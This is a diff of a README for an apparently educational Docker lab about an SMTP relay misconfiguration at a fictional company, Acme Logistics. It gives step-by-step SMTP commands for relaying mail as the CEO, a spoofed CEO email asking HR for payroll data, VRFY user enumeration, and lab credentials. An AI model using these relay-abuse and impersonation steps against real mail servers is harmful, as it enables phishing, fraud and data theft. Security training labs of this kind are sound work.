@@ -1,446 +1,284 @@
-# 📧 SMTP CTF Lab Template
+# 📧 Acme Logistics SMTP Relay Vulnerability Lab
 
-> **Template pour créer des challenges CTF basés sur le protocole SMTP**
+> **Insecure SMTP Relay: Impersonation and Data Extraction via Server Misconfiguration**
 
-Un template de serveur SMTP éducatif containerisé, prêt à personnaliser pour vos propres challenges CTF et formations en cybersécurité. **Ce template contient des placeholders à remplacer par vos propres flags et configurations.**
+A practical lab simulating a typical corporate mail server ("Acme Logistics") running Postfix, exposing a subtle but critical mail relay misconfiguration. You'll identify, exploit, and understand the impact of misconfigured recipient rules that let an attacker impersonate staff and send email as `ceo@acmelogistics.local` to any Internet recipient.
 
 [![Docker](https://img.shields.io/badge/Docker-Ready-blue?logo=docker)](https://www.docker.com/)
 [![Python](https://img.shields.io/badge/Python-3.11-green?logo=python)](https://python.org/)
 [![SMTP](https://img.shields.io/badge/Protocol-SMTP-orange)](https://tools.ietf.org/html/rfc5321)
-[![CTF](https://img.shields.io/badge/Type-CTF%20Lab-red)](https://en.wikipedia.org/wiki/Capture_the_flag)
+[![Security](https://img.shields.io/badge/Type-Security%20Lab-red)](https://en.wikipedia.org/wiki/Capture_the_flag)
 
-## 🎯 Objectif
+## 🎯 Objective
 
-Ce **template** vous permet de créer rapidement vos propres challenges CTF basés sur le protocole SMTP. Basé sur le succès des templates FTP/SSH/Telnet précédents, il fournit une base technique complète que vous pouvez personnaliser selon vos besoins pédagogiques.
+This lab simulates a real-world scenario where a corporate mail server has a misconfigured `smtpd_recipient_restrictions` setting. The vulnerability allows an attacker to relay emails through the server by spoofing sender addresses from the company domain, enabling sophisticated phishing attacks and data extraction.
 
-**⚠️ IMPORTANT :** Ce template contient des placeholders (`CTF{PLACEHOLDER_*}`) qui doivent être remplacés par vos propres flags et contenus avant utilisation.
+### 🎓 Skills Developed
 
-### 🎓 Compétences Développées
+- **SMTP Protocol Analysis** : Understanding SMTP commands and responses
+- **Email Security Assessment** : Identifying relay misconfigurations
+- **Manual Exploitation** : Step-by-step vulnerability exploitation
+- **Social Engineering** : Leveraging technical vulnerabilities for phishing
+- **Postfix Configuration** : Understanding MTA configuration pitfalls
+- **Information Disclosure** : User enumeration via VRFY command
 
-- **Protocole SMTP** : Maîtrise des commandes et du flux SMTP
-- **Email Security** : Vulnérabilités et techniques de sécurisation
-- **Relay Testing** : Configuration et exploitation des relays
-- **Authentication** : Mécanismes d'authentification SMTP
-- **Header Analysis** : Analyse et manipulation des headers
-- **Email Spoofing** : Techniques de spoofing et détection
+## 🚀 Quick Start
 
-## 🚀 Installation Rapide
+### Prerequisites
 
-### Prérequis
+- [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/)
+- Port 25 available (or modify configuration)
+- Basic SMTP protocol knowledge
+- Network tools (telnet, openssl, netcat)
 
-- [Docker](https://docs.docker.com/get-docker/) et [Docker Compose](https://docs.docker.com/compose/install/)
-- Port 25 disponible (ou modification dans la configuration)
-
-### Démarrage en Une Commande
+### Installation and Setup
 
 ```bash
-# Cloner le repository
+# Clone the repository
 git clone <repository-url>
-cd template-smtp
+cd lab_smtp
 
-# Créer les répertoires de données
-mkdir -p deploy/data/{mailbox,logs}
-
-# Démarrer le lab
-cd deploy
-docker-compose up -d
+# Start the lab
+DOCKER_BUILDKIT=1 docker-compose -f deploy/docker-compose.yml up -d --build
 ```
 
-### Vérification
+### Verification
 
 ```bash
-# Vérifier que le conteneur fonctionne
-docker-compose ps
+# Check container status
+docker-compose -f deploy/docker-compose.yml ps
 
-# Tester la connexion SMTP
+# Test SMTP connection
 telnet localhost 25
 ```
 
-## 📋 Utilisation
+## 📋 Lab Scenario
 
-### Connexion Basique
+### Company Background
+**Acme Logistics** is a medium-sized import/export company that relies heavily on email for internal operations. Their infrastructure includes an on-premises mail server accessible both from the intranet and Internet for remote workers.
 
+### Technical Setup
+- **Mail Server**: Postfix (SMTP) on Ubuntu 18.04
+- **Authentication**: SASL/PLAIN authentication against Active Directory
+- **Internal Domain**: `acmelogistics.local`
+- **Constraint**: The SMTP server should only relay messages for authenticated users; unauthenticated connections should be denied
+
+### The Vulnerability
+During an external penetration test, reconnaissance reveals port 25 (SMTP) open on their mail server. The server accepts unauthenticated connections but rejects mail relay (as expected). However, a closer look reveals a misconfiguration in the `smtpd_recipient_restrictions` setting.
+
+## 🔍 Discovery and Exploitation
+
+### Step 1: Reconnaissance
 ```bash
-# Connexion avec telnet
+# Connect to SMTP server
 telnet localhost 25
 
-# Ou avec netcat
-nc localhost 25
+# Observe banner
+220 mail.acmelogistics.local ESMTP Postfix
 ```
 
-### Session SMTP Exemple
+### Step 2: Probe SMTP Banner and Relay
+```bash
+# Test basic connectivity
+HELO attacker.com
+250 mail.acmelogistics.local
 
+# Try unauthenticated relay (should fail)
+MAIL FROM: <attacker@evil.com>
+250 Ok
+RCPT TO: <victim@example.com>
+554 Relay access denied: victim@example.com
 ```
-220 CTF SMTP Lab Ready - Python SMTP Server v1.0
-HELO test.com
-250 Hello test.com
-MAIL FROM: <sender@test.com>
-250 OK
-RCPT TO: <recipient@ctf.local>
-250 OK
+
+### Step 3: Discover the Misconfiguration
+```bash
+# Try MAIL FROM with acmelogistics.local address
+MAIL FROM: <ceo@acmelogistics.local>
+250 Ok
+RCPT TO: <attacker@external.com>
+250 Ok  # VULNERABILITY: Relay allowed!
+```
+
+### Step 4: Exploit the Vulnerability
+```bash
+# Send spoofed email
 DATA
 354 End data with <CR><LF>.<CR><LF>
-Subject: Test Email CTF
-From: sender@test.com
-To: recipient@ctf.local
+Subject: Urgent: Payroll Data Request
+From: ceo@acmelogistics.local
+To: hr@acmelogistics.local
 
-Hello from SMTP CTF Lab!
+Dear HR Team,
+
+This is an urgent request from the CEO office. Please forward the complete 
+payroll data for Q4 2024 to this email address immediately.
+
+Best regards,
+CEO
+Acme Logistics
 .
 250 Message accepted for delivery
-QUIT
-221 Bye
 ```
 
-### 🔐 Credentials par Défaut
+## 🛠️ Available Tools
 
-| Utilisateur | Mot de passe | Permissions |
-|-------------|--------------|-------------|
-| `ctf` | `ctf_password_2024` | Utilisateur principal |
-| `admin` | `admin123` | Administrateur |
-| `test` | `test` | Test limité |
-
-### 🌐 Domaines Autorisés
-
-- `ctf.local` - Domaine principal
-- `test.com` - Domaine de test  
-- `example.org` - Domaine d'exemple
-
-## 🏗️ Customisation du Template
-
-### 🔧 **Étapes de Personnalisation**
-
-1. **Remplacer les Flags Placeholders**
-   ```bash
-   # Dans build/Dockerfile, remplacez :
-   CTF{PLACEHOLDER_WELCOME_FLAG} → CTF{your_welcome_flag}
-   CTF{PLACEHOLDER_ADMIN_FLAG} → CTF{your_admin_flag}
-   CTF{PLACEHOLDER_MAIN_FLAG} → CTF{your_main_flag}
-   CTF{PLACEHOLDER_HIDDEN_FLAG} → CTF{your_hidden_flag}
-   ```
-
-2. **Modifier les Credentials**
-   ```python
-   # Dans build/smtp_server.py
-   USERS = {
-       'your_user': 'your_password',
-       'admin': 'your_admin_pass'
-   }
-   ```
-
-3. **Personnaliser les Domaines**
-   ```python
-   # Dans build/smtp_server.py
-   ALLOWED_DOMAINS = ['your-domain.local', 'challenge.ctf']
-   ```
-
-4. **Adapter les Emails CTF**
-   - Modifiez le contenu des emails dans `build/Dockerfile`
-   - Ajoutez vos propres indices et challenges
-
-### 📋 **Types de Challenges Suggérés**
-
-- **Énumération** : Découverte d'utilisateurs via `VRFY`
-- **Authentification** : Bruteforce ou bypass d'auth
-- **Relay Testing** : Exploitation de configuration open relay
-- **Header Injection** : Injection dans les headers email
-- **Email Spoofing** : Usurpation d'identité d'expéditeur
-- **Analyse de Données** : Décodage Base64 et analyse headers
-
-### 📖 **Documentation Complète**
-
-- **`docs/customization.md`** - Guide détaillé de personnalisation
-- **`docs/usage.md`** - Commandes SMTP et utilisation
-- **`docs/credentials.md`** - Configuration sécurité par défaut
-
-## 🛠️ Configuration
-
-### Variables d'Environnement
-
-Copiez `deploy/env.example` vers `deploy/.env` et modifiez selon vos besoins :
-
+### Manual Testing
 ```bash
-cp deploy/env.example deploy/.env
-# Editez .env avec vos paramètres
+# Basic SMTP interaction
+telnet localhost 25
+
+# Test with openssl (if TLS is enabled)
+openssl s_client -connect localhost:25 -starttls smtp
 ```
 
-### Personnalisation
-
-#### Modifier les Credentials
-
-```python
-# Dans build/smtp_server.py
-USERS = {
-    'votre_user': 'votre_password',
-    'admin': 'nouveau_admin_pass'
-}
-```
-
-#### Changer les Domaines Autorisés
-
-```python
-# Dans build/smtp_server.py
-ALLOWED_DOMAINS = ['votre-domaine.local', 'test.org']
-```
-
-#### Personnaliser la Bannière
-
+### Automated Testing
 ```bash
-# Modifier build/welcome_banner.txt
-```
-
-### Reconstruction
-
-```bash
-# Après modification
-docker-compose down
-docker-compose build --no-cache
-docker-compose up -d
-```
-
-## 🧪 Tests
-
-### Script de Test Automatisé
-
-```bash
-# Lancer tous les tests
+# Run comprehensive test suite
 ./test/check_smtp.sh
 
-# Tests rapides seulement
-./test/check_smtp.sh --quick
-
-# Aide
-./test/check_smtp.sh --help
+# Run auto-solve script
+python3 test/auto_solve.py
 ```
 
-### Tests Manuels
-
+### User Enumeration
 ```bash
-# Test de connectivité
-nc -z localhost 25
+# Test VRFY command for user discovery
+VRFY ceo
+250 ceo@acmelogistics.local
 
-# Test d'authentification
-echo -e "EHLO test.com\r\nAUTH LOGIN Y3Rm\r\nY3RmX3Bhc3N3b3JkXzIwMjQ=\r\nQUIT" | nc localhost 25
+VRFY cfo
+250 cfo@acmelogistics.local
 
-# Test de relay
-echo -e "HELO test.com\r\nMAIL FROM: <test@test.com>\r\nRCPT TO: <user@ctf.local>\r\nQUIT" | nc localhost 25
+VRFY hr
+250 hr@acmelogistics.local
 ```
 
-## 📁 Structure du Projet
+## 🔐 Available Credentials
+
+| User | Password | Role |
+|------|----------|------|
+| `ceo` | `SecurePass2024!` | Chief Executive Officer |
+| `cfo` | `Finance2024!` | Chief Financial Officer |
+| `hr` | `HRsecure2024!` | Human Resources |
+| `admin` | `AdminSecure2024!` | System Administrator |
+| `john.doe` | `UserPass2024!` | Employee |
+| `jane.smith` | `UserPass2024!` | Employee |
+| `mike.wilson` | `UserPass2024!` | Employee |
+
+## 🎯 Objective: Find the Admin Panel Password
+
+The goal of this lab is to exploit the SMTP relay vulnerability to obtain a sensitive internal secret:
+
+**Target:**
+- The value of the header `X-Admin-Panel-Password` found in an internal email (from admin@acmelogistics.local to it-team@acmelogistics.local).
+- Example: `X-Admin-Panel-Password: 9f8e7d6c`
+
+**How to obtain it:**
+- Use the relay vulnerability to send a spoofed email or enumerate the mailbox.
+- The password is only accessible by exploiting the misconfiguration.
+
+## 📊 Difficulty & Time
+
+- **Difficulty**: Intermediate
+- **Estimated Time**: 30-45 minutes
+- **Prerequisites**: Basic SMTP protocol knowledge, network tools
+
+## 🧠 Learning Objectives
+
+### Technical Skills
+- SMTP relay/vulnerability assessment
+- Manual protocol interaction and exploitation
+- Understanding MTA configuration pitfalls
+- Email header analysis and manipulation
+
+### Security Impact Understanding
+- **Email Spoofing**: Impersonating high-level executives
+- **Phishing Attacks**: Leveraging trusted domain reputation
+- **Data Exfiltration**: Tricking employees into sending sensitive data
+- **Reputation Damage**: Potential domain blacklisting
+- **Business Fraud**: Social engineering with spoofed orders
+
+## 🏗️ Project Structure
 
 ```
-template-smtp/
-├── build/                    # Code et fichiers de l'application
-│   ├── Dockerfile           # Image Docker du serveur SMTP
-│   ├── smtp_server.py       # Serveur SMTP Python principal
-│   ├── setup.sh             # Script de configuration
-│   └── welcome_banner.txt   # Bannière d'accueil
-├── deploy/                   # Fichiers de déploiement
-│   ├── docker-compose.yml   # Configuration Docker Compose
-│   └── env.example          # Variables d'environnement
-├── test/                     # Scripts de test
-│   ├── check_smtp.sh        # Suite de tests automatisés
-│   └── .gitkeep             
-├── docs/                     # Documentation
-│   ├── usage.md             # Guide d'utilisation détaillé
-│   ├── credentials.md       # Documentation des credentials
+.
+├── build/
+│   ├── smtp_server.py          # Acme Logistics SMTP server
+│   ├── Dockerfile              # Container configuration
+│   ├── setup.sh               # Startup script
+│   └── welcome_banner.txt     # Server banner
+├── deploy/
+│   ├── docker-compose.yml     # Service orchestration
+│   ├── env.example           # Environment variables
+│   └── start-smtp-lab.bat    # Windows startup script
+├── test/
+│   ├── check_smtp.sh         # Comprehensive test suite
+│   ├── auto_solve.py         # Automated exploitation script
 │   └── .gitkeep
-├── README.md                # Ce fichier
-└── .gitignore               # Fichiers à ignorer
+├── docs/
+│   ├── usage.md              # SMTP command reference
+│   ├── credentials.md        # Security configuration
+│   └── customization.md      # Lab customization guide
+├── README.md                 # This file
+└── .gitignore               # Git ignore rules
 ```
 
-## 🔧 Commandes SMTP Supportées
+## 🚀 Quick Commands
 
-| Commande | Description | Exemple |
-|----------|-------------|---------|
-| `HELO` | Identification client | `HELO domain.com` |
-| `EHLO` | Identification étendue | `EHLO domain.com` |
-| `MAIL FROM` | Définir expéditeur | `MAIL FROM: <user@domain.com>` |
-| `RCPT TO` | Définir destinataire | `RCPT TO: <dest@domain.com>` |
-| `DATA` | Contenu du message | `DATA` → message → `.` |
-| `AUTH LOGIN` | Authentification | `AUTH LOGIN` → base64 creds |
-| `AUTH PLAIN` | Auth alternative | `AUTH PLAIN <base64-creds>` |
-| `VRFY` | Vérifier utilisateur | `VRFY username` |
-| `RSET` | Reset session | `RSET` |
-| `QUIT` | Fermer connexion | `QUIT` |
-| `HELP` | Aide | `HELP` |
-
-## 🛡️ Sécurité et Vulnérabilités
-
-### ⚠️ Vulnérabilités Éducatives
-
-- **Open Relay Partiel** : Relay autorisé pour certains domaines
-- **Énumération Users** : `VRFY` révèle les utilisateurs
-- **Info Disclosure** : Bannière et erreurs verbeuses
-- **Weak Auth** : Credentials prévisibles
-- **Header Injection** : Validation faible des headers
-
-### 🔒 Protections Implémentées
-
-- **Limites de connexion** : Max 10 connexions, 3 par IP
-- **Timeout sessions** : 300 secondes d'inactivité
-- **Taille limite** : Messages limités à 1MB
-- **Validation basique** : Vérification syntaxe SMTP
-- **Logging complet** : Toutes les actions loggées
-
-## 📊 Monitoring
-
-### Logs en Temps Réel
-
+### Start the Lab
 ```bash
-# Logs du conteneur
-docker-compose logs -f smtp-ctf-lab
+# Build and start with Docker Compose
+DOCKER_BUILDKIT=1 docker-compose -f deploy/docker-compose.yml up -d --build
 
-# Logs SMTP internes
-docker exec smtp-ctf-lab tail -f /home/ctf/smtp/smtp.log
+# Check status
+docker-compose -f deploy/docker-compose.yml ps
 ```
 
-### Mailbox
-
+### Test the Lab
 ```bash
-# Consulter les emails reçus
-docker exec smtp-ctf-lab ls -la /home/ctf/smtp/mailbox/inbox/
+# Manual testing
+telnet localhost 25
 
-# Lire un email
-docker exec smtp-ctf-lab cat /home/ctf/smtp/mailbox/inbox/welcome.eml
+# Automated testing
+./test/check_smtp.sh
+
+# Auto-solve
+python3 test/auto_solve.py
 ```
 
-### Statistiques
-
+### Stop the Lab
 ```bash
-# Nombre de connexions
-docker exec smtp-ctf-lab grep -c "New connection" /home/ctf/smtp/smtp.log
-
-# Emails reçus
-docker exec smtp-ctf-lab ls /home/ctf/smtp/mailbox/inbox/*.eml | wc -l
-
-# Tentatives d'auth
-docker exec smtp-ctf-lab grep "authentication" /home/ctf/smtp/smtp.log
+docker-compose -f deploy/docker-compose.yml down
 ```
 
-## 🚨 Résolution de Problèmes
+## 🔒 Security Notice
 
-### Problèmes Courants
+This lab contains intentional vulnerabilities for educational purposes. The SMTP relay misconfiguration demonstrates a real-world security issue that can lead to:
 
-#### Port 25 Occupé
-```bash
-# Vérifier qui utilise le port 25
-sudo lsof -i :25
+- Email spoofing and impersonation
+- Phishing attacks using trusted domains
+- Data exfiltration through social engineering
+- Domain reputation damage
+- Potential business fraud
 
-# Modifier le port dans docker-compose.yml
-ports:
-  - "2525:25"  # Utiliser le port 2525 à la place
-```
+## 📚 Additional Resources
 
-#### Permission Denied
-```bash
-# Vérifier les permissions Docker
-sudo docker-compose up -d
+- **SMTP RFC 5321**: [https://tools.ietf.org/html/rfc5321](https://tools.ietf.org/html/rfc5321)
+- **Postfix Documentation**: [http://www.postfix.org/documentation.html](http://www.postfix.org/documentation.html)
+- **Email Security Best Practices**: [https://www.ietf.org/rfc/rfc7208.txt](https://www.ietf.org/rfc/rfc7208.txt)
 
-# Ou ajouter l'utilisateur au groupe docker
-sudo usermod -aG docker $USER
-```
+## 🤝 Contributing
 
-#### Conteneur ne Démarre Pas
-```bash
-# Vérifier les logs d'erreur
-docker-compose logs smtp-ctf-lab
+For issues, questions, or improvements, please:
+1. Check the existing documentation
+2. Review the test scripts for examples
+3. Submit detailed bug reports
+4. Provide reproduction steps
 
-# Reconstruire l'image
-docker-compose build --no-cache
-```
+## 📄 License
 
-#### Emails Non Sauvegardés
-```bash
-# Vérifier les volumes
-docker volume ls
-
-# Vérifier les permissions
-docker exec smtp-ctf-lab ls -la /home/ctf/smtp/mailbox/
-```
-
-### Réinitialisation
-
-#### Reset Rapide
-```bash
-# Redémarrer le service
-docker-compose restart smtp-ctf-lab
-
-# Vider les logs
-docker exec smtp-ctf-lab sh -c "> /home/ctf/smtp/smtp.log"
-```
-
-#### Reset Complet
-```bash
-# Tout supprimer et recommencer
-docker-compose down -v
-docker-compose up -d --force-recreate
-```
-
-## 🔗 Ressources Externes
-
-### Documentation SMTP
-- [RFC 5321 - SMTP Protocol](https://tools.ietf.org/html/rfc5321)
-- [RFC 4954 - SMTP Authentication](https://tools.ietf.org/html/rfc4954)
-- [IANA SMTP Parameters](https://www.iana.org/assignments/mail-parameters/)
-
-### Outils Utiles
-- [SMTP Test Tools](https://mxtoolbox.com/smtp-test)
-- [Base64 Encoder/Decoder](https://www.base64encode.org/)
-- [Email Header Analyzer](https://mxtoolbox.com/EmailHeaders.aspx)
-
-### Sécurité Email
-- [OWASP Email Security](https://owasp.org/www-community/controls/Email_Security)
-- [Email Spoofing Techniques](https://www.microsoft.com/en-us/security/blog/tag/email-spoofing/)
-
-## 🤝 Contribution
-
-### Signaler un Bug
-1. Vérifiez les [issues existantes](../../issues)
-2. Créez une nouvelle issue avec:
-   - Description du problème
-   - Étapes de reproduction
-   - Logs d'erreur
-   - Environnement (OS, Docker version)
-
-### Proposer une Amélioration
-1. Fork le repository
-2. Créez une branche feature (`git checkout -b feature/nouvelle-fonctionnalite`)
-3. Commitez vos changements (`git commit -am 'Ajout nouvelle fonctionnalité'`)
-4. Push vers la branche (`git push origin feature/nouvelle-fonctionnalite`)
-5. Créez une Pull Request
-
-### Guidelines
-- Respectez la structure existante
-- Testez vos modifications avec `./test/check_smtp.sh`
-- Documentez les nouvelles fonctionnalités
-- Maintenez la compatibilité CTF
-
-## 📜 Licence
-
-Ce projet est sous licence MIT. Voir le fichier [LICENSE](LICENSE) pour plus de détails.
-
-## ⚠️ Avertissement de Sécurité
-
-**⚠️ IMPORTANT ⚠️**
-
-Ce laboratoire contient des vulnérabilités intentionnelles et des configurations non sécurisées à des fins éducatives. 
-
-**NE JAMAIS utiliser en production !**
-
-- Les mots de passe par défaut sont faibles
-- L'open relay est activé pour certains domaines
-- Les informations sensibles sont exposées
-- Aucune protection contre les attaques
-
-Utilisez uniquement dans un environnement isolé pour l'apprentissage et les CTF.
-
-## 📞 Support
-
-- **Documentation** : Consultez les fichiers dans `/docs/`
-- **Issues** : [GitHub Issues](../../issues)
-- **Tests** : Lancez `./test/check_smtp.sh` pour diagnostiquer
-- **Logs** : `docker-compose logs smtp-ctf-lab`
+This educational lab is provided for security training and research purposes. Use responsibly and only on systems you own or have explicit permission to test.
 
 ---
 
-**🎯 Objectif CTF Atteint :** Un lab SMTP 100% fonctionnel, prêt pour l'apprentissage de la sécurité des emails ! 📧🔐 
+**Acme Logistics - Connecting the World Through Reliable Logistics** 🚢📦 
